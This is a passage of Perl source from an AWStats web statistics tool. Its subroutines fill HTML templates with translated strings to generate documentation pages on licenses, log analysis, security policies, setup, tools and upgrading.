	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--card-bg:#ffffff;--code-bg:#f1f5f9;--accent:#3b82f6;--accent-soft:#dbeafe;--surface:#ffffff;--surface-secondary:#f9fafb;--table-header:#e5e7eb;--table-row-even:#f9fafb;--permission-yes:#059669;--permission-no:#dc2626;--permission-maybe:#d97706;--permission-special:#7c3aed;--badge-bg:#e5e7eb;--category-bg:#f3f4f6}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--card-bg:#2d3748;--code-bg:#2d3748;--accent:#60a5fa;--accent-soft:#1e3a5f;--surface:#2d3748;--surface-secondary:#1f2937;--table-header:#374151;--table-row-even:#1f2937;--permission-yes:#34d399;--permission-no:#f87171;--permission-maybe:#fbbf24;--permission-special:#c084fc;--badge-bg:#374151;--category-bg:#2d3748}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1400px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1{color:var(--text-color);border-bottom:2px solid var(--accent);padding-bottom:10px;font-size:2em;margin-bottom:20px}.doc-nav{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);display:flex;gap:15px;flex-wrap:wrap;position:sticky;top:0;z-index:10;backdrop-filter:blur(10px)}.doc-nav a{color:var(--link-color);text-decoration:none;padding:5px 10px;border-radius:4px;transition:background-color 0.2s}.doc-nav a:hover{background-color:var(--border-color)}.doc-card{background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px;padding:25px;margin-bottom:30px}.license-intro{background-color:var(--accent-soft);padding:24px;border-radius:30px;margin-bottom:30px}.license-intro p{font-size:1.1rem;margin:0}.license-intro p:first-child{margin-bottom:10px}.license-chart-container{overflow-x:auto;margin:20px 0;border-radius:12px;border:1px solid var(--border-color)}.license-table{width:100%;border-collapse:collapse;min-width:1000px}.license-table th{background-color:var(--table-header);color:var(--text-color);padding:12px 8px;text-align:center;font-weight:600;border:1px solid var(--border-color)}.license-table td{padding:10px 8px;border:1px solid var(--border-color);vertical-align:middle}.license-table tr:nth-child(even){background-color:var(--table-row-even)}.license-table tr:hover{background-color:var(--border-color)}.category-row td{background-color:var(--category-bg);font-weight:600;text-align:left;padding:12px 15px}.license-badge{display:inline-block;padding:4px 8px;background-color:var(--badge-bg);border-radius:12px;font-size:0.9rem;font-family:'Monaco','Menlo',monospace}.permission-yes{color:var(--permission-yes);font-weight:600}.permission-no{color:var(--permission-no);font-weight:600}.permission-maybe{color:var(--permission-maybe);font-weight:600}.permission-special{color:var(--permission-special);font-weight:600}.license-notes{margin:30px 0;padding:20px;background-color:var(--surface-secondary);border:1px solid var(--border-color);border-radius:12px}.license-notes p{margin:8px 0;line-height:1.5}.note-number{display:inline-block;width:24px;height:24px;background-color:var(--accent);color:white;border-radius:50%;text-align:center;line-height:24px;font-size:0.9rem;margin-right:8px}.license-date{margin-top:20px;padding:15px;background-color:var(--surface-secondary);border-radius:8px;font-style:italic;color:var(--text-color);opacity:0.8;text-align:center}hr{border:none;border-top:1px solid var(--border-color);margin:30px 0}.footer-note{margin-top:40px;padding:20px;background-color:var(--header-bg);border-radius:8px;text-align:center;font-size:0.9em}sup{font-size:0.7rem;vertical-align:super}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}
    </style>
</head>
<body>
    <div class="doc-card">
        <h1>$doc_title</h1>
        
        <div class="license-intro">
            <p>$license_desc</p>
            <p style="color: var(--text-secondary);">$license_follow</p>
        </div>
        
        <h2>$chart_title</h2>
        
        <!-- 现代化表格 -->
        <div class="license-chart-container">
            <table class="license-table">
                $table_header
                <tbody>
                    $category_free
                    $row_public_domain
                    $row_mit
                    $row_bsd2
                    $row_bsd3
                    $row_apache2
                    $row_isc
                    $row_lgpl
                    $row_mpl2
                    $row_gpl
                    $row_agpl3
                    $row_epl2
                    $row_cddl1
                    
                    $category_semi_free
                    $row_semi_free
                    
                    $category_proprietary
                    $row_freeware
                    $row_shareware
                    $row_commercial
                    
                    $category_modern
                    $row_python
                    $row_php
                    $row_artistic
                    $row_osl3
                </tbody>
            </table>
        </div>
        <div class="license-notes">
            $notes_title
            $note1
            $note2
            $note3
            $note4
            $note5
            $note6
            $note7
            $note8
            $note9
            $note10
            <br>
            $important_title
            $important_desc
        </div>
        
        <div class="license-date">
            $license_date
        </div>
    </div>
    
    <hr>
    
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
    </div>
    
$theme_script
</body>
</html>
END_HTML

    my $doc_dir = "$dir/docs";
    open(my $fh, '>:encoding(UTF-8)', "$doc_dir/awstats_license.html") or return;
    print $fh $html;
    close $fh;

    print "DEBUG: Generated awstats_license.html in $doc_dir with language $lang\n" if $Debug;
}

#------------------------------------------------------------------------------
# 生成 loganalysispaper 文档页面
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_loganalysispaper_doc {
    my ($dir) = @_;
    
    # 获取页面标题
    my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
    my $theme_script = get_theme_script();
    # ========== 文档基本信息 ==========
    my $doc_title = _t("docs.loganalysispaper.title");
    my $subtitle = _t("docs.loganalysispaper.subtitle");
    my $full_title = "$doc_title - $page_title";
    my $SPONSOR_SECTION = _t("sponsor.section");
    # ========== 引言 ==========
    my $intro = _t("paper.intro");
    
    # ========== 方法总标题 ==========
    my $methods_title = _t("paper.methods.title");
    
    # ========== HTML 标签计数器 ==========
    my $htmltag_title = _t("paper.method.htmltag.title");
    my $htmltag_desc = _t("paper.method.htmltag.desc");
    my $htmltag_pros_title = _t("paper.method.htmltag.pros.title");
    my $htmltag_pros_list = _t("paper.method.htmltag.pros.list");
    my $htmltag_cons_title = _t("paper.method.htmltag.cons.title");
    my $htmltag_cons_list = _t("paper.method.htmltag.cons.list");
    my $htmltag_summary_title = _t("paper.method.htmltag.summary.title");
    my $htmltag_summary = _t("paper.method.htmltag.summary");
    
    # ========== 日志分析 ==========
    my $loganalysis_title = _t("paper.method.loganalysis.title");
    my $loganalysis_desc = _t("paper.method.loganalysis.desc");
	# ========== 日志分析 - 基础模型 ==========
	my $loganalysis_basic_title = _t("paper.loganalysis.basic_model.title");
	my $loganalysis_basic_desc = _t("paper.loganalysis.basic_model.desc");

	# ========== 日志分析 - 缓存 ==========
	my $loganalysis_cache_title = _t("paper.loganalysis.cache.title");
	my $loganalysis_cache_desc = _t("paper.loganalysis.cache.desc");

	# ========== 日志分析 - 你能知道什么 ==========
	my $loganalysis_what_you_know_title = _t("paper.loganalysis.what_you_know.title");
	my $loganalysis_what_you_know_desc = _t("paper.loganalysis.what_you_know.desc");

	# ========== 日志分析 - 你不能知道什么 ==========
	my $loganalysis_what_you_dont_know_title = _t("paper.loganalysis.what_you_dont_know.title");
	my $loganalysis_what_you_dont_know_desc = _t("paper.loganalysis.what_you_dont_know.desc");

	# ========== 日志分析 - 真实数据 ==========
	my $loganalysis_real_data_title = _t("paper.loganalysis.real_data.title");
	my $loganalysis_real_data_desc = _t("paper.loganalysis.real_data.desc");

	# ========== 日志分析 - 结论 ==========
	my $loganalysis_conclusion_title = _t("paper.loganalysis.conclusion.title");
	my $loganalysis_conclusion_desc = _t("paper.loganalysis.conclusion.desc");

	# ========== 日志分析 - 致谢和进一步阅读 ==========
	my $loganalysis_acknowledgements_title = _t("paper.loganalysis.acknowledgements.title");
	my $loganalysis_acknowledgements_desc = _t("paper.loganalysis.acknowledgements.desc");
    # ========== 应用追踪 ==========
    my $apptracking_title = _t("paper.method.apptracking.title");
    my $apptracking_desc = _t("paper.method.apptracking.desc");
    my $apptracking_pros_title = _t("paper.method.apptracking.pros.title");
    my $apptracking_pros_list = _t("paper.method.apptracking.pros.list");
    my $apptracking_cons_title = _t("paper.method.apptracking.cons.title");
    my $apptracking_cons_list = _t("paper.method.apptracking.cons.list");
    my $apptracking_summary_title = _t("paper.method.apptracking.summary.title");
    my $apptracking_summary = _t("paper.method.apptracking.summary");
    
    # ========== AWStats 工作原理 ==========
    my $awstats_title = _t("paper.awstats.howitworks.title");
    my $awstats_desc = _t("paper.awstats.howitworks.desc");
    
    # ========== 结论 ==========
    my $conclusion_title = _t("paper.conclusion.title");
    my $conclusion = _t("paper.conclusion");
    
    # ========== 其他文章 ==========
    my $otherarticles_title = _t("paper.otherarticles.title");
    my $otherarticles_list = _t("paper.otherarticles.list");
    
    # ========== 页脚 ==========
    my $footer_author = _t("paper.footer.author");
    my $footer_googleplus = _t("paper.footer.googleplus");
    
    # 获取语言和方向
    my $lang = $Lang || 'en';
    my $dir_attr = $PageDir ? 'rtl' : 'ltr';
    
    my $html = <<"END_HTML";
<!DOCTYPE html>
<html lang="$lang" dir="$dir_attr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="AWStats $doc_title">
    <meta name="keywords" content="awstats, log analysis, web statistics, tracking">
    <title>$full_title</title>
    <style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--card-bg:#ffffff;--code-bg:#f1f5f9;--accent:#3b82f6;--accent-soft:#dbeafe;--surface:#ffffff;--surface-secondary:#f9fafb;--pros-bg:#e6f7e6;--pros-color:#059669;--cons-bg:#fee9e9;--cons-color:#dc2626;--summary-bg:#e6f3ff}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--card-bg:#2d3748;--code-bg:#2d3748;--accent:#60a5fa;--accent-soft:#1e3a5f;--surface:#2d3748;--surface-secondary:#1f2937;--pros-bg:#064e3b;--pros-color:#34d399;--cons-bg:#7f1d1d;--cons-color:#f87171;--summary-bg:#1e3a5f}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1000px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1{color:var(--text-color);border-bottom:2px solid var(--accent);padding-bottom:10px;font-size:2em;margin-bottom:20px}h2{color:var(--text-color);border-bottom:1px solid var(--border-color);padding-bottom:8px;font-size:1.5em;margin:30px 0 20px}h3{color:var(--text-color);font-size:1.2em;margin:20px 0 10px}.doc-nav{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);display:flex;gap:15px;flex-wrap:wrap;position:sticky;top:0;z-index:10;backdrop-filter:blur(10px)}.doc-nav a{color:var(--link-color);text-decoration:none;padding:5px 10px;border-radius:4px;transition:background-color 0.2s}.doc-nav a:hover{background-color:var(--border-color)}.paper-section{background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px;padding:25px;margin-bottom:30px}.intro-box{background-color:var(--accent-soft);border-left:4px solid var(--accent);padding:20px;border-radius:8px;margin:20px 0}.pros-box{background-color:var(--pros-bg);border-left:4px solid var(--pros-color);padding:15px;border-radius:8px;margin:15px 0}.pros-box h3{color:var(--pros-color);margin-top:0}.cons-box{background-color:var(--cons-bg);border-left:4px solid var(--cons-color);padding:15px;border-radius:8px;margin:15px 0}.cons-box h3{color:var(--cons-color);margin-top:0}.summary-box{background-color:var(--summary-bg);border-left:4px solid var(--accent);padding:15px;border-radius:8px;margin:15px 0}.summary-box h3{color:var(--accent);margin-top:0}.conclusion-box{background-color:var(--header-bg);border:1px solid var(--border-color);padding:20px;border-radius:8px;margin:20px 0;font-style:italic}ul{margin:10px 0;padding-left:25px}li{margin:5px 0}hr{border:none;border-top:1px solid var(--border-color);margin:30px 0}.footer-note{margin-top:40px;padding:20px;background-color:var(--header-bg);border-radius:8px;text-align:center;font-size:0.9em}.footer-note a{color:var(--link-color);text-decoration:none}.footer-note a:hover{text-decoration:underline}.work-in-progress{color:var(--text-color);opacity:0.6;font-style:italic;text-align:center;padding:10px}.loganalysis-subsection{margin:30px 0;padding:20px;background-color:var(--surface-secondary);border:1px solid var(--border-color);border-radius:8px}.loganalysis-subsection h3{color:var(--accent);margin-top:0;margin-bottom:15px;font-size:1.2em;border-bottom:1px solid var(--border-color);padding-bottom:8px}.loganalysis-subsection ol,.loganalysis-subsection ul{margin:10px 0;padding-left:25px}.loganalysis-subsection li{margin:5px 0}.loganalysis-subsection p{margin:10px 0}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}
    </style>
</head>
<body>
    <div class="paper-section">
        <h1>$doc_title</h1>
        
        <div class="intro-box">
            $intro
        </div>
        
        $methods_title
        
        <div id="htmltag">
            $htmltag_title
            $htmltag_desc
            
            <div class="pros-box">
                $htmltag_pros_title
                $htmltag_pros_list
            </div>
            
            <div class="cons-box">
                $htmltag_cons_title
                $htmltag_cons_list
            </div>
            
            <div class="summary-box">
                $htmltag_summary_title
                $htmltag_summary
            </div>
        </div>
        
		<div id="loganalysis">
			$loganalysis_title
			
			<div class="paper-section">
				$loganalysis_desc
				
				<!-- 1. 基础模型 -->
				<div class="loganalysis-subsection">
					$loganalysis_basic_title
					$loganalysis_basic_desc
				</div>
				
				<!-- 2. 缓存 -->
				<div class="loganalysis-subsection">
					$loganalysis_cache_title
					$loganalysis_cache_desc
				</div>
				
				<!-- 3. 你能知道什么 -->
				<div class="loganalysis-subsection">
					$loganalysis_what_you_know_title
					$loganalysis_what_you_know_desc
				</div>
				
				<!-- 4. 你不能知道什么 -->
				<div class="loganalysis-subsection">
					$loganalysis_what_you_dont_know_title
					$loganalysis_what_you_dont_know_desc
				</div>
				
				<!-- 5. 真实数据 -->
				<div class="loganalysis-subsection">
					$loganalysis_real_data_title
					$loganalysis_real_data_desc
				</div>
				
				<!-- 6. 结论 -->
				<div class="loganalysis-subsection">
					$loganalysis_conclusion_title
					$loganalysis_conclusion_desc
				</div>
				
				<!-- 7. 致谢和进一步阅读 -->
				<div class="loganalysis-subsection">
					$loganalysis_acknowledgements_title
					$loganalysis_acknowledgements_desc
				</div>
			</div>
		</div>
        
        <!-- ==================== 应用追踪 ==================== -->
        <div id="apptracking">
            $apptracking_title
            $apptracking_desc
            
            <div class="pros-box">
                $apptracking_pros_title
                $apptracking_pros_list
            </div>
            
            <div class="cons-box">
                $apptracking_cons_title
                $apptracking_cons_list
            </div>
            
            <div class="summary-box">
                $apptracking_summary_title
                $apptracking_summary
            </div>
        </div>
        
        <!-- ==================== AWStats 工作原理 ==================== -->
        <div id="howitworks">
            $awstats_title
            <div class="paper-section">
                $awstats_desc
            </div>
        </div>
        
        <!-- ==================== 结论 ==================== -->
        <div class="conclusion-box">
            $conclusion_title
            $conclusion
        </div>
        
        <!-- ==================== 其他文章 ==================== -->
        <h2>$otherarticles_title</h2>
        <div class="paper-section">
            $otherarticles_list
        </div>
        
        <hr>
        
        <div class="footer-note">
            <p>$footer_author</p>
            $footer_googleplus
        </div>
    </div>
    
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
    </div>
    
$theme_script
</body>
</html>
END_HTML

    my $doc_dir = "$dir/docs";
    open(my $fh, '>:encoding(UTF-8)', "$doc_dir/awstats_loganalysispaper.html") or return;
    print $fh $html;
    close $fh;

    print "DEBUG: Generated awstats_loganalysispaper.html in $doc_dir with language $lang\n" if $Debug;
}

#------------------------------------------------------------------------------
# 生成 security 文档页面
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_security_doc {
    my ($dir) = @_;
    
    # 获取页面标题
    my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $SPONSOR_SECTION = _t("sponsor.section");
    my $theme_script = get_theme_script();
    # ========== 文档基本信息 ==========
    my $doc_title = _t("docs.security.title");
    my $subtitle = _t("docs.security.subtitle");
    my $full_title = "$doc_title - $page_title";
    # ========== 引言 ==========
    my $intro = _t("security.intro");
    
    # ========== 安全策略 1 ==========
	my $label_policy = _t("security.label.policy");
	my $label_advantage = _t("security.label.advantage");
	my $label_disadvantage = _t("security.label.disadvantage");
	my $label_how = _t("security.label.how");
    my $policy1_title = _t("security.policy1.title");
    my $policy1_policy = _t("security.policy1.policy");
    my $policy1_advantage = _t("security.policy1.advantage");
    my $policy1_disadvantage = _t("security.policy1.disadvantage");
    my $policy1_how = _t("security.policy1.how");
    
    # ========== 安全策略 2 ==========
    my $policy2_title = _t("security.policy2.title");
    my $policy2_policy = _t("security.policy2.policy");
    my $policy2_advantage = _t("security.policy2.advantage");
    my $policy2_disadvantage = _t("security.policy2.disadvantage");
    my $policy2_how = _t("security.policy2.how");
    
    # ========== AWSTATS_FORCE_CONFIG 环境变量 ==========
    my $force_config = _t("security.force_config");
    
    # ========== 安全策略 3 ==========
    my $policy3_title = _t("security.policy3.title");
    my $policy3_policy = _t("security.policy3.policy");
    my $policy3_advantage = _t("security.policy3.advantage");
    my $policy3_disadvantage = _t("security.policy3.disadvantage");
    my $policy3_how = _t("security.policy3.how");
    
    # ========== 结论 ==========
    my $conclusion = _t("security.conclusion");
    
    # ========== 页脚 ==========
    my $footer_author = _t("security.footer.author");
    my $footer_twitter = _t("security.footer.twitter");
    
    # 获取语言和方向
    my $lang = $Lang || 'en';
    my $dir_attr = $PageDir ? 'rtl' : 'ltr';
    
    my $html = <<"END_HTML";
<!DOCTYPE html>
<html lang="$lang" dir="$dir_attr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="AWStats $doc_title">
    <meta name="keywords" content="awstats, security, authentication, permissions">
    <title>$full_title</title>
    <style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--card-bg:#ffffff;--code-bg:#f1f5f9;--accent:#3b82f6;--accent-soft:#dbeafe;--surface:#ffffff;--surface-secondary:#f9fafb;--policy-high:#8b5cf6;--policy-medium:#f59e0b;--policy-none:#6b7280;--policy-high-soft:#ede9fe;--policy-medium-soft:#fef3c7;--policy-none-soft:#f3f4f6}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--card-bg:#2d3748;--code-bg:#2d3748;--accent:#60a5fa;--accent-soft:#1e3a5f;--surface:#2d3748;--surface-secondary:#1f2937;--policy-high:#a78bfa;--policy-medium:#fbbf24;--policy-none:#9ca3af;--policy-high-soft:#2d2b4d;--policy-medium-soft:#4d3d1f;--policy-none-soft:#2d3748}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1000px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1{color:var(--text-color);border-bottom:2px solid var(--accent);padding-bottom:10px;font-size:2em;margin-bottom:20px}.doc-nav{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);display:flex;gap:15px;flex-wrap:wrap;position:sticky;top:0;z-index:10;backdrop-filter:blur(10px)}.doc-nav a{color:var(--link-color);text-decoration:none;padding:5px 10px;border-radius:4px;transition:background-color 0.2s}.doc-nav a:hover{background-color:var(--border-color)}.security-section{background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px;padding:25px;margin-bottom:30px}.intro-box{background-color:var(--accent-soft);border-left:4px solid var(--accent);padding:20px;border-radius:8px;margin:20px 0}.policy-card{margin:30px 0;padding:25px;border-radius:12px;border-left:6px solid;scroll-margin-top:80px}.policy-card h2{margin-top:0;font-size:1.5em;border-bottom:1px solid var(--border-color);padding-bottom:10px}.policy-high{background-color:var(--policy-high-soft);border-left-color:var(--policy-high)}.policy-medium{background-color:var(--policy-medium-soft);border-left-color:var(--policy-medium)}.policy-none{background-color:var(--policy-none-soft);border-left-color:var(--policy-none)}.policy-high h2{color:var(--policy-high)}.policy-medium h2{color:var(--policy-medium)}.policy-none h2{color:var(--policy-none)}.policy-label{display:inline-block;font-weight:600;margin-top:15px;color:var(--accent)}pre{background-color:var(--code-bg);padding:15px;border-radius:8px;overflow-x:auto;border:1px solid var(--border-color);font-family:'Monaco','Menlo',monospace;font-size:0.9rem;margin:15px 0}code{background-color:var(--code-bg);padding:2px 6px;border-radius:4px;font-family:'Monaco','Menlo',monospace;font-size:0.9rem}.tip-box{background-color:var(--header-bg);border-left:4px solid var(--accent);padding:20px;border-radius:8px;margin:20px 0}hr{border:none;border-top:1px solid var(--border-color);margin:30px 0}.footer-note{margin-top:40px;padding:20px;background-color:var(--header-bg);border-radius:8px;text-align:center;font-size:0.9em}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}
    </style>
</head>
<body>
    <h1>$doc_title</h1>
    
    <div class="security-section">
        <!-- ==================== 引言 ==================== -->
        <div class="intro-box">
            $intro
        </div>
        
        <!-- ==================== 安全策略 1 ==================== -->
        <div id="1" class="policy-card policy-high">
            $policy1_title
            
            <div class="policy-label">$label_policy</div>
            $policy1_policy
            
            <div class="policy-label">$label_advantage</div>
            $policy1_advantage
            
            <div class="policy-label">$label_disadvantage</div>
            $policy1_disadvantage
            
            <div class="policy-label">$label_how</div>
            $policy1_how
        </div>
        
        <!-- ==================== 安全策略 2 ==================== -->
        <div id="2" class="policy-card policy-medium">
            $policy2_title
            
            <div class="policy-label">$label_policy</div>
            $policy2_policy
            
            <div class="policy-label">$label_advantage</div>
            $policy2_advantage
            
            <div class="policy-label">$label_disadvantage</div>
            $policy2_disadvantage
            
            <div class="policy-label">$label_how</div>
            $policy2_how
            
            <!-- ==================== AWSTATS_FORCE_CONFIG 环境变量 ==================== -->
            <div class="tip-box">
                $force_config
            </div>
        </div>
        
        <!-- ==================== 安全策略 3 ==================== -->
        <div id="3" class="policy-card policy-none">
            $policy3_title
            
            <div class="policy-label">$label_policy</div>
            $policy3_policy
            
            <div class="policy-label">$label_advantage</div>
            $policy3_advantage
            
            <div class="policy-label">$label_disadvantage</div>
            $policy3_disadvantage
            
            <div class="policy-label">$label_how</div>
            $policy3_how
        </div>
        
        <!-- ==================== 结论 ==================== -->
        <div class="tip-box">
            $conclusion
        </div>
    </div>
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
    </div>
$theme_script
</body>
</html>
END_HTML

    my $doc_dir = "$dir/docs";
    open(my $fh, '>:encoding(UTF-8)', "$doc_dir/awstats_security.html") or return;
    print $fh $html;
    close $fh;

    print "DEBUG: Generated awstats_security.html in $doc_dir with language $lang\n" if $Debug;
}
#------------------------------------------------------------------------------
# 生成 setup 页面
# Parameters: $dir (setup目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_setup_doc {
    my ($dir) = @_;
    
    my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $SPONSOR_SECTION = _t("sponsor.section");
	my $theme_script = get_theme_script();
    my $doc_title = _t("docs.setup.title");
    my $subtitle = _t("docs.setup.subtitle");
    my $content = _t("docs.setup.content");
       $content =~ s/\\n/\n/g;
    my $full_title = "$doc_title - $page_title";
    
    my $lang = $Lang || 'en';
    my $dir_attr = $PageDir ? 'rtl' : 'ltr';
    
    my $html = <<"END_HTML";
<!DOCTYPE html>
<html lang="$lang" dir="$dir_attr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="AWStats $doc_title">
    <meta name="keywords" content="awstats, setup, install, configure">
    <title>$full_title</title>
    <style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--code-bg:#f1f5f9}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--code-bg:#2d3748}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1200px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1,h2,h3,h4{color:var(--text-color);border-bottom:1px solid var(--border-color);padding-bottom:10px}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.code-block{background-color:var(--code-bg);padding:15px;border-radius:8px;overflow-x:auto;border:1px solid var(--border-color);font-family:monospace;white-space:pre-wrap;margin:15px 0}.step{margin:25px 0;padding:15px;background-color:var(--header-bg);border:1px solid var(--border-color);border-radius:8px}.step-detail{margin:20px 0;padding:15px;background-color:var(--bg-color);border-radius:6px}.note{font-style:italic;opacity:0.8}.conclusion{font-weight:bold;color:var(--link-color)}.footer{margin-top:40px;padding:20px;text-align:center;border-top:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin:5px 0}
    </style>
</head>
<body>
    <h1>$doc_title</h1>
    <div class="subtitle">$subtitle</div>
    <div class="section">
        $content
    </div>
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
    </div>
$theme_script
</body>
</html>
END_HTML

    my $doc_dir = "$dir/docs";
    open(my $fh, '>:encoding(UTF-8)', "$doc_dir/awstats_setup.html") or return;
    print $fh $html;
    close $fh;

    print "DEBUG: Generated awstats_setup.html in $doc_dir with language $lang\n" if $Debug;
}
#------------------------------------------------------------------------------
# 生成 tools 文档页面
# Parameters: $dir (tools目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_tools_doc {
    my ($dir) = @_;
    
    my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $SPONSOR_SECTION = _t("sponsor.section");
	my $theme_script = get_theme_script();
    my $doc_title = _t("docs.tools.title");
    my $subtitle = _t("docs.tools.subtitle");
    my $content = _t("docs.tools.content");
	   $content =~ s/\\n/\n/g;
    my $full_title = "$doc_title - $page_title";
    
    my $lang = $Lang || 'en';
    my $dir_attr = $PageDir ? 'rtl' : 'ltr';
    
    my $html = <<"END_HTML";
<!DOCTYPE html>
<html lang="$lang" dir="$dir_attr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="AWStats $doc_title">
    <meta name="keywords" content="awstats, tools, utilities, awstats_updateall, awstats_buildstaticpages, logresolvemerge, maillogconvert, urlaliasbuilder">
    <title>$full_title</title>
    <style>
    :root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--code-bg:#f1f5f9;--warning-color:#b91c1c}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--code-bg:#2d3748;--warning-color:#f87171}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1200px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1,h2,h3,h4{color:var(--text-color);border-bottom:1px solid var(--border-color);padding-bottom:10px}a{color:var(--link-color);text-decoration:none}a:hover{text-decoration:underline}.code-block{background-color:var(--code-bg);padding:15px;border-radius:8px;overflow-x:auto;border:1px solid var(--border-color);font-family:monospace;white-space:pre-wrap;margin:15px 0}.tool-section{margin:30px 0;padding:20px;background-color:var(--header-bg);border:1px solid var(--border-color);border-radius:8px}.usage{margin:20px 0;padding:15px;background-color:var(--bg-color);border-radius:6px}.example{margin:20px 0;padding:15px;background-color:var(--bg-color);border-left:4px solid var(--link-color);border-radius:4px}.note{font-style:italic;opacity:0.8;color:var(--link-color)}.warning{color:var(--warning-color);font-weight:bold}.footer{margin-top:40px;padding:20px;text-align:center;border-top:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin:5px 0}code{background-color:var(--code-bg);padding:2px 4px;border-radius:4px;font-family:monospace}
    </style>
</head>
<body>
    <h1>$doc_title</h1>
    <div class="subtitle">$subtitle</div>
    <div class="section">
        $content
    </div>
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
    </div>
$theme_script
</body>
</html>
END_HTML

    my $doc_dir = "$dir/docs";
    open(my $fh, '>:encoding(UTF-8)', "$doc_dir/awstats_tools.html") or return;
    print $fh $html;
    close $fh;

    print "DEBUG: Generated awstats_tools.html in $doc_dir with language $lang\n" if $Debug;
}
#------------------------------------------------------------------------------
# 生成 upgrade 文档页面
# Parameters: $dir (upgrade目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_upgrade_doc {
    my ($dir) = @_;
    
    my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $SPONSOR_SECTION = _t("sponsor.section");
	my $theme_script = get_theme_script();
    my $doc_title = _t("docs.upgrade.title");
    my $subtitle = _t("docs.upgrade.subtitle");
    my $content = _t("docs.upgrade.content");
    $content =~ s/\\n/\n/g;
    my $full_title = "$doc_title - $page_title";
    
    my $lang = $Lang || 'en';
    my $dir_attr = $PageDir ? 'rtl' : 'ltr';
    
    my $html = <<"END_HTML";
<!DOCTYPE html>
<html lang="$lang" dir="$dir_attr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="AWStats $doc_title">
    <meta name="keywords" content="awstats, upgrade, update, migration">
    <title>$full_title</title>
    <style>
